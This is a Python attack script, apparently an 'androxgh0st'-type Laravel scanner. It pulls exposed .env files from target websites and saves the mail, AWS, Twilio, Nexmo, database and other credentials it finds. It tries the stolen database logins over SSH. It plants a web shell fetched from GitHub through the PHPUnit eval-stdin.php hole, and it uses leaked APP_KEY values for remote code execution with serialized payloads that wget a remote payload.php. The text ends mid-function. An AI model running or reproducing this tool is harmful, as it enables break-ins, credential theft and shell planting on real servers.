# -*- coding: utf-8 -*-
#https://t.me/v3n0mhack
from multiprocessing.dummy import Pool
import paramiko, sys, getpass
from subprocess import check_output
import warnings,random,socket
from re import findall as reg
import requests, re, sys, os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
from time import time as timer  
import time
init()

Headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
                      "AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }

def get_smtp(url,text):
  try:
    if "MAIL_HOST" in text:
      if "MAIL_HOST=" in text:
        
        mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
        mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
        mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
        mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
        build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)
        remover = str(build).replace('\r', '')
        save = open('Resultz/SMTP_RANDOM.txt', 'a')
        save.write(str(remover)+'\n\n')
        save.close()
        sds = "\033[1;32;40m SMTP"
        return sds
      else:
          sdsx = "\033[1;31;40m SMTP"
          return sdsx
    else:
        sdsx = "\033[1;31;40m SMTP"
        return sdsx

  except Exception as e:
    sdsx = "\033[1;31;40m SMTP"
    return sdsx
def get_shell(url):
  try:
     #data2 = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsKCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsKCWN1cmxfY2xvc2UoJGNoKTsKCWZjbG9zZSgkZnApOwoJb2JfZmx1c2goKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcigiaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zaW5vbngvMTQyOThkYTQzMDFhYzRkYzg1ZGRmMGNkMjlhOTVlNmEvcmF3L2JiMzc2NTUxNjdkNzBjMWYyMTdkZjE0MzMzMDBjODNlMzQ0Y2I2MWQvIiwiYXMucGhwIikpIHsKCWVjaG8gIlN1a3NlcyI7Cn0gZWxzZSB7CgllY2hvICJmYWlsIjsKfQo/Pg==')); ?>"
     cmd1 = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsKCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsKCWN1cmxfY2xvc2UoJGNoKTsKCWZjbG9zZSgkZnApOwoJb2JfZmx1c2goKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcigiaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zaW5vbngvMTQyOThkYTQzMDFhYzRkYzg1ZGRmMGNkMjlhOTVlNmEvcmF3L2JiMzc2NTUxNjdkNzBjMWYyMTdkZjE0MzMzMDBjODNlMzQ0Y2I2MWQvIiwiYXMucGhwIikpIHsKCWVjaG8gIlN1a3Nlc2dibGsiOwp9IGVsc2UgewoJZWNobyAiZmFpbCI7Cn0KPz4=')); ?>"
     see = requests.session()
     Agent4 = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
     ktn4 = see.get(url, headers=Agent4, data=cmd1, verify=False, timeout=8)
     shell_path = url.replace('eval-stdin.php', 'as.php')
     if 'Suksesgblk' in ktn4.text:


        save = open('Resultz/SHELL.txt', 'a')
        save.write(str(shell_path)+'\n')
        save.close()

        sds = "\033[1;32;40m SHELL"
        return sds
     else:
        sdsx = "\033[1;31;40m SHELL"
        return sdsx

  except Exception as e:
    sdsx = "\033[1;31;40m SHELL"
    return str(sdsx)

def get_appkey(url,text):
  try:

    key = re.findall("APP_KEY=(.*?)\n", text)[0]
    if key == '':
      sdsx = "\033[1;31;40m RCE"
      return sdsx
    else:
      if "base64:" in key:
        key = key.replace("base64:", "")
      else:
        key = key
      pay1 = "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIqZXZlbnRzIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6Iipmb3JtYXR0ZXJzIjthOjE6e3M6ODoiZGlzcGF0Y2giO3M6NjoiYXNzZXJ0Ijt9fXM6ODoiKmV2ZW50IjtzOjIxOiJ1bmFtZSAtYTtlY2hvIENvbjdleHQiO30="
      pay2 = "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIqZXZlbnRzIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6Iipmb3JtYXR0ZXJzIjthOjE6e3M6ODoiZGlzcGF0Y2giO3M6NjoiYXNzZXJ0Ijt9fXM6ODoiKmV2ZW50IjtzOjcxOiJ3Z2V0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmMKb20vcmludG9kL3Rvb2xvbC9tYXN0ZXIvcGF5bG9hZC5waHAiO30="
      gen = check_output(["php", "gen.php", key,  pay1])
      gen2 = check_output(["php", "gen.php", key, pay2])
      code = re.findall("##(.*?)##", gen)[0]
      code2 = re.findall("##(.*?)##", gen2)[0]
      njir = requests.post(url, headers={"X-XSRF-TOKEN": code}, verify=False,timeout=8)
      if "Con7ext" in njir.text.encode('utf8'):
        cok = requests.post(url, headers={"X-XSRF-TOKEN": code2}, verify=False,timeout=8)
        shel = requests.get(url +"/payload.php", verify=False)
        if ">>" in shel.text.encode('utf8') and shel.status_code == 200:

          save = open('Resultz/SHELL.txt', 'a')
          save.write(str(url+"/payload.php")+'\n')
          save.close()
          sds = "\033[1;32;40m RCE"
          return sds
        else:
          sds = "\033[1;32;40m RCE"
          return sds
          save = open('Resultz/RCE.txt', 'a')
          save.write(str(url)+'\n')
          save.close()
      else:
        sdsx = "\033[1;31;40m RCE"
        return sdsx

  except Exception as e:
    sdsx = "\033[1;31;40m RCE"
    return str(sdsx)

def get_twillio(url,text):
  try:
    if "TWILIO_ACCOUNT_SID=" in text:
      acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
      acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', text)[0]
      sec = reg('\nTWILIO_API_SECRET=(.*?)\n', text)[0]
      chatid = reg('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', text)[0]
      phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
      auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]

      build = 'URL: '+url+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = build.replace('\r', '')
      save = open('Resultz/TWILLIO.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      sds = "\033[1;32;40m TWILLIO"
      return sds
    else:
      sdsx = "\033[1;31;40m TWILLIO"
      return sdsx

  except Exception as e:
    sdsx = "\033[1;31;40m TWILLIO"
    return sdsx

def get_aws(url,text):
  try:
    if 'AWS_ACCESS_KEY_ID=' in text:
      mailhostx = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
      mailhost = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
      mailport = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
      mailuser = reg("\nAWS_DEFAULT_REGION=(.*?)\n", text)[0]
      if "AKIA" in mailhost:
        build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)+'\nMAIL_FROM: '+str(mailhostx)
        remover = str(build).replace('\r', '')
        save = open('Resultz/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        sds = "\033[1;32;40m AWS"
        return sds
      else:
        sdsx = "\033[1;31;40m AWS"
        return sdsx
    else:
      sdsx = "\033[1;31;40m AWS"
      return sdsx

  except Exception as e:
    sdsx = "\033[1;31;40m AWS"
    return sdsx

def get_db(url,text):
  try:
    if 'DB_USERNAME=' in text:
      mailhost = reg("\nDB_HOST=(.*?)\n", text)[0]
      mailport = reg("\nDB_USERNAME=(.*?)\n", text)[0]
      mailuser = reg("\nDB_PASSWORD=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nDB_HOST: '+str(mailhost)+'\nDB_USERNAME: '+str(mailport)+'\nDB_PASSWORD: '+str(mailuser)
      remover = str(build).replace('\r', '')
      save = open('Resultz/DB.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      sds = "\033[1;32;40m DB"
      return sds
    else:
      sdsx = "\033[1;31;40m DB"
      return sdsx

  except Exception as e:
    sdsx = "\033[1;31;40m DB"
    return sdsx

def get_ssh(url,text):
  try:
    if 'DB_USERNAME=' in text:
      meki = reg("//(.*?)/.env",url)[0]
      mailport = reg("\nDB_USERNAME=(.*?)\n", text)[0]
      mailuser = reg("\nDB_PASSWORD=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nSSH_HOST: '+str(meki)+'\nSSH_USERNAME: '+str(mailport)+'\nSSH_PASSWORD: '+str(mailuser)
      #print str(build)
      remover = str(build).replace('\r', '')

      client = paramiko.SSHClient()
      client.load_system_host_keys()
      client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
      client.connect(str(meki),"22",str(mailport),str(mailuser))
      stdin, stdout, stderr = client.exec_command('uname -a')
      if "Linux " in (stdout.read()):
        save = open('Resultz/SSH.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        sds = "\033[1;32;40m SSH"
        return sds
      else:
        sdsx = "\033[1;31;40m SSH"
        return sdsx
    else:
      sdsx = "\033[1;31;40m SSH"
      return sdsx
  
  except Exception as e:
    sdsx = "\033[1;31;40m SSH"
    return str(sdsx)#+str(build)

def get_nexmo(url,text):
  try:
    if "NEXMO_KEY" in text:
      if "NEXMO_KEY=" in text:
        try:
          nexmo_key = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
        except:
          nexmo_key = ''
        try:
          nexmo_secret = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
        except:
          nexmo_secret = ''
        try:
          phone = reg('\nNEXMO_NUMBER=(.*?)\n', text)[0]
        except:
          phone = ''
        build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
        remover = str(build).replace('\r', '')
        save = open('Resultz/NEXMO.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        sds = "\033[1;32;40m NEXMO"
        return sds
      else:
        sdsx = "\033[1;31;40m NEXMO"
        return sdsx
    else:
      sdsx = "\033[1;31;40m NEXMO"
      return sdsx
      

  except Exception as e:
    sdsx = "\033[1;31;40m NEXMO"
    return str(sdsx)#+str(build)

def get_exotel(url,text):
  try:
    if "EXOTEL_API_KEY" in text:
      if "EXOTEL_API_KEY=" in text:
        try:
          nexmo_key = reg('\nEXOTEL_API_KEY=(.*?)\n', text)[0]
        except:
          nexmo_key = ''
        try:
          nexmo_secret = reg('\nEXOTEL_API_TOKEN=(.*?)\n', text)[0]
        except:
          nexmo_secret = ''
        try:
          phone = reg('\nEXOTEL_API_SID=(.*?)\n', text)[0]
        except:
          phone = ''
        build = 'URL: '+str(url)+'\nexotel_key: '+str(nexmo_key)+'\nexotel_token: '+str(nexmo_secret)+'\nexotel_sid: '+str(phone)
        remover = str(build).replace('\r', '')
        save = open('Resultz/EXOTEL.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        sds = "\033[1;32;40m EXOTEL"
        return sds
      else:
        sdsx = "\033[1;31;40m EXOTEL"
        return sdsx
    else:
      sdsx = "\033[1;31;40m EXOTEL"
      return sdsx
      

  except Exception as e:
    sdsx = "\033[1;31;40m EXOTEL"
    return str(sdsx)#+str(build)

def get_onesignal(url,text):
  try:
    if "ONESIGNAL_APP_ID" in text:
      if "ONESIGNAL_APP_ID=" in text:
        try:
          nexmo_key = reg('\nONESIGNAL_APP_ID=(.*?)\n', text)[0]
        except:
          nexmo_key = ''
        try:
          nexmo_secret = reg('\nONESIGNAL_REST_API_KEY=(.*?)\n', text)[0]
        except:
          nexmo_secret = ''
        try:
          phone = reg('\nONESIGNAL_USER_AUTH_KEY=(.*?)\n', text)[0]
        except:
          phone = ''
        build = 'URL: '+str(url)+'\nonesignal_id: '+str(nexmo_key)+'\nonesignal_key: '+str(nexmo_secret)+'\nonesignal_auth_key: '+str(phone)
        remover = str(build).replace('\r', '')
        save = open('Resultz/ONESIGNAL.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        sds = "\033[1;32;40m ONESIGNAL"
        return sds
      else:
        sdsx = "\033[1;31;40m ONESIGNAL"
        return sdsx
    else:
      sdsx = "\033[1;31;40m ONESIGNAL"
      return sdsx



      

  except Exception as e:
    sdsx = "\033[1;31;40m ONESIGNAL"
    return str(sdsx)#+str(build)



def get_plivo(url,text):
  try:
    if "PLIVO_AUTH_ID" in text:
      if "PLIVO_AUTH_ID=" in text:
        try:
          nexmo_key = reg('\nPLIVO_AUTH_ID=(.*?)\n', text)[0]
        except:
          nexmo_key = ''
        try:
          nexmo_secret = reg('\nPLIVO_AUTH_TOKEN=(.*?)\n', text)[0]
        except:
          nexmo_secret = ''

        build = 'URL: '+str(url)+'\nplivo_id: '+str(nexmo_key)+'\nplivo_token: '+str(nexmo_secret)
        remover = str(build).replace('\r', '')
        save = open('Resultz/PLIVO.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        sds = "\033[1;32;40m PLIVO"
        return sds
      else:
        sdsx = "\033[1;31;40m PLIVO"
        return sdsx
    else:
      sdsx = "\033[1;31;40m PLIVO"
      return sdsx



      

  except Exception as e:
    sdsx = "\033[1;31;40m ONESIGNAL"
    return str(sdsx)#+str(build)


def get_nexmo2(url,text):
  try:

    if '<td>NEXMO_KEY</td>' in text:

      try:
        nexmo_key = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_key = ''
      try:
        nexmo_secret = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_secret = ''
      try:
        phone = reg('<td>NEXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = ''
      build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
      remover = str(build).replace('\r', '')
      save = open('Resultz/NEXMO.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      sds = "\033[1;32;40m NEXMO"
      return sds
    else:

      sdsx = "\033[1;31;40m NEXMO"
      return sdsx

  except Exception as e:
    sdsx = "\033[1;31;40m NEXMO"
    return sdsx

#ssssssssssss
def get_exotel(url,text):
  try:

    if '<td>NEXMO_KEY</td>' in text:

      try:
        nexmo_key = reg('<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_key = ''
      try:
        nexmo_secret = reg('<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_secret = ''
      try:
        phone = reg('<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = ''
      build = 'URL: '+str(url)+'\nexotel_key: '+str(nexmo_key)+'\nexotel_token: '+str(nexmo_secret)+'\nexotel_sid: '+str(phone)
      remover = str(build).replace('\r', '')
      save = open('Resultz/EXOTEL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      sds = "\033[1;32;40m EXOTEL"
      return sds
    else:

      sdsx = "\033[1;31;40m EXOTEL"
      return sdsx

  except Exception as e:
    sdsx = "\033[1;31;40m EXOTEL"
    return sdsx


def get_onesignal(url,text):
  try:

    if '<td>ONESIGNAL_APP_ID</td>' in text:

      try:
        nexmo_key = reg('<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_key = ''
      try:
        nexmo_secret = reg('<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_secret = ''
      try:
        phone = reg('<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        phone = ''
      build = 'URL: '+str(url)+'\nonesignal_id: '+str(nexmo_key)+'\nonesignal_key: '+str(nexmo_secret)+'\nonesignal_auth_key: '+str(phone)
      remover = str(build).replace('\r', '')
      save = open('Resultz/ONESIGNAL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      sds = "\033[1;32;40m ONESIGNAL"
      return sds
    else:

      sdsx = "\033[1;31;40m ONESIGNAL"
      return sdsx

  except Exception as e:
    sdsx = "\033[1;31;40m ONESIGNAL"
    return sdsx


def get_plivo(url,text):
  try:

    if '<td>PLIVO_AUTH_ID</td>' in text:

      try:
        nexmo_key = reg('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_key = ''
      try:
        nexmo_secret = reg('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        nexmo_secret = ''

      build = 'URL: '+str(url)+'\nplivo_id: '+str(nexmo_key)+'\nplivo_token: '+str(nexmo_secret)
      remover = str(build).replace('\r', '')
      save = open('Resultz/PLIVO.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      sds = "\033[1;32;40m PLIVO"
      return sds
    else:

      sdsx = "\033[1;31;40m PLIVO"
      return sdsx

  except Exception as e:
    sdsx = "\033[1;31;40m PLIVO"
    return sdsx

#sssssssssssss



def get_appkey2(url,text):
  try:
#<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)##<\/span>
    key = reg("<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
    if key == '':
      sdsx = "\033[1;31;40m RCE"
      return sdsx
    else:
      if "base64:" in key:
        key = key.replace("base64:", "")
      else:
        key = key
      pay1 = "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIqZXZlbnRzIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6Iipmb3JtYXR0ZXJzIjthOjE6e3M6ODoiZGlzcGF0Y2giO3M6NjoiYXNzZXJ0Ijt9fXM6ODoiKmV2ZW50IjtzOjIxOiJ1bmFtZSAtYTtlY2hvIENvbjdleHQiO30="
      pay2 = "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIqZXZlbnRzIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6Iipmb3JtYXR0ZXJzIjthOjE6e3M6ODoiZGlzcGF0Y2giO3M6NjoiYXNzZXJ0Ijt9fXM6ODoiKmV2ZW50IjtzOjcxOiJ3Z2V0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmMKb20vcmludG9kL3Rvb2xvbC9tYXN0ZXIvcGF5bG9hZC5waHAiO30="
      gen = check_output(["php", "gen.php", key,  pay1])
      gen2 = check_output(["php", "gen.php", key, pay2])
      code = re.findall("##(.*?)##", gen)[0]
      code2 = re.findall("##(.*?)##", gen2)[0]
      njir = requests.post(url, headers={"X-XSRF-TOKEN": code}, verify=False,timeout=8)
      if "Con7ext" in njir.text:
        cok = requests.post(url, headers={"X-XSRF-TOKEN": code2}, verify=False,timeout=8)
        shel = requests.get(url +"/payload.php", verify=False)
        if ">>" in shel.text and shel.status_code == 200:

          save = open('Resultz/SHELL.txt', 'a')
          save.write(str(url+"/payload.php")+'\n')
          save.close()
          sds = "\033[1;32;40m RCE"
          return sds
        else:
          sds = "\033[1;32;40m RCE"
          return sds
          save = open('Resultz/RCE.txt', 'a')
          save.write(str(url)+'\n')
          save.close()
      else:
        sdsx = "\033[1;31;40m RCE"
        return sdsx

  except Exception as e:
    sdsx = "\033[1;31;40m RCE"
    return str(sdsx)


def get_smtp2(url,text):
  try:
    text = str(text)
    if "MAIL_HOST" in text:
      if "<td>MAIL_HOST</td>" in text:
        mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)
        remover = str(build).replace('\r', '')
        save = open('Resultz/SMTP_RANDOM.txt', 'a')
        save.write(str(remover)+'\n\n')
        save.close()
        sds = "\033[1;32;40m SMTP"
        return sds
      else:

        sdsx = "\033[1;31;40m SMTP"
        return sdsx
    else:

      sdsx = "\033[1;31;40m SMTP"
      return sdsx
  except Exception as e:
    sdsx = "\033[1;31;40m SMTP"
    return sdsx


def get_twillio2(url,text):
  try:
    text = str(text)
    if '<td>TWILIO_ACCOUNT_SID</td>' in text:
      acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = str(build).replace('\r', '')
      save = open('Resultz/TWILLIO.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      sds = "\033[1;32;40m TWILLIO"
      return sds
    else:
      sdsx = "\033[1;31;40m TWILLIO"
      return sdsx


  except Exception as e:
    sdsx = "\033[1;31;40m TWILLIO"
    return sdsx


def get_db2(url,text):
  try:
    text = str(text)
    if '<td>DB_USERNAME</td>' in text:
      acc_sid = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      acc_key = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      acc_kexs = reg('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nDB_HOST: '+str(acc_kexs)+'\nDB_USERNAME: '+str(acc_sid)+'\nDB_PASSWORD: '+str(acc_key)+'\n'
      remover = str(build).replace('\r', '')
      save = open('Resultz/DB.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      sds = "\033[1;32;40m DB"
      return sds
    else:
      sdsx = "\033[1;31;40m DB"
      return sdsx


  except Exception as e:
    sdsx = "\033[1;31;40m DB"
    return sdsx



def get_ssh2(url,text):
  try:
    text = str(text)
    if '<td>DB_USERNAME</td>' in text:
      meki = re.findall("://(.*)/",url)[0]
      acc_sid = reg('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      acc_key = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nSSH_HOST: '+str(meki)+'\nSSH_USERNAME: '+str(acc_sid)+'\nSSH_PASSWORD: '+str(acc_key)+'\n'
      #print str(build)
      remover = str(build).replace('\r', '')
      client = paramiko.SSHClient()
      client.load_system_host_keys()
      client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
      client.connect(str(meki),"22",str(acc_sid),str(acc_key))
      stdin, stdout, stderr = client.exec_command('uname -a')
      if "Linux " in (stdout.read()):
        save = open('Resultz/SSH.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        sds = "\033[1;32;40m SSH"
        return sds
      else:
        sdsx = "\033[1;31;40m SSH"
        return sdsx
    else:
      sdsx = "\033[1;31;40m SSH"
      return sdsx


  except Exception as e:
    sdsx = "\033[1;31;40m SSH"
    return str(sdsx)



def get_aws2(url,text):
  try:
    text = str(text)

    if '<td>AWS_ACCESS_KEY_ID</td>' in text:
      mailhostx = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      mailhost = reg('<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]#reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
      mailport = reg('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]#reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
      mailuser = reg('<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]#reg("\nAWS_DEFAULT_REGION=(.*?)\n", text)[0]
      if "AKIA" in mailhost:

        build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)+'\nMAIL_FROM: '+str(mailhostx)
        remover = str(build).replace('\r', '')
        save = open('Resultz/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        sds = "\033[1;32;40m AWS"
        return sds
      else:
        sdsx = "\033[1;31;40m AWS"
        return sdsx
    else:
      sdsx = "\033[1;31;40m AWS"
      return sdsx
  
  except Exception as e:
    sdsx = "\033[1;31;40m AWS"
    return str(e)


def di_chckngntd(url):
  try:
    headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
    get_source = requests.get(url+"/.env", headers=headers, verify=False, allow_redirects=False,timeout=8).text.encode('utf8')
    #print str(get_source)
    if "APP_KEY=" in str(get_source):
      #dok = (url+"/.env",str(get_source))
      print str(url)+"  --> "+str(get_shell(url+"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"))+"\033[1;37;40m | "+str(get_appkey(url,str(get_source)))+"\033[1;37;40m | "+str(get_smtp(url+"/.env",str(get_source)))+"\033[1;37;40m  | "+str(get_aws(url+"/.env",str(get_source)))+"\033[1;37;40m | "+str(get_twillio(url+"/.env",str(get_source)))+"\033[1;37;40m | "+str(get_ssh(url+"/.env",str(get_source)))+"\033[1;37;40m | "+str(get_nexmo(url+"/.env",str(get_source)))+"\033[1;37;40m | "+str(get_exotel(url+"/.env",str(get_source)))+"\033[1;37;40m | "+str(get_onesignal(url+"/.env",str(get_source)))+"\033[1;37;40m | "+str(get_plivo(url+"/.env",str(get_source)))+"\033[1;37;40m | "+str(get_db(url+"/.env",str(get_source)))+"\033[1;37;40m"
    else:
      get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, verify=False, allow_redirects=False,timeout=8).text.encode('utf8')
